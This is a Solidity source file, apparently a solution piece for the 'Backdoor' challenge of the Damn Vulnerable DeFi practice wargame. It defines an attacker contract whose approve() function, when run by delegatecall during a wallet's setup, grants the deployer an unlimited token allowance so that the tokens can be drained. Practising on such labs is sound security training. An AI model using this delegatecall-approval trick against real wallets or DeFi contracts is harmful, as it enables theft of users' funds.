// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../backdoor/WalletRegistry.sol";
import "../DamnValuableToken.sol";
import "hardhat/console.sol";

contract BackdoorAttacker {
    // Note: as we will use delegateCall to run approve() and execute code in another contract
    // environment variable in storage will not be accessible. Thus state variable are declared
    // immutable and embedded in runtime code. 
    DamnValuableToken private immutable token;
    address public immutable owner;

    constructor(address _token) {
        token = DamnValuableToken(_token);
        owner = msg.sender;
    }

    function approve() external {
        token.approve(owner, type(uint256).max);
    }
}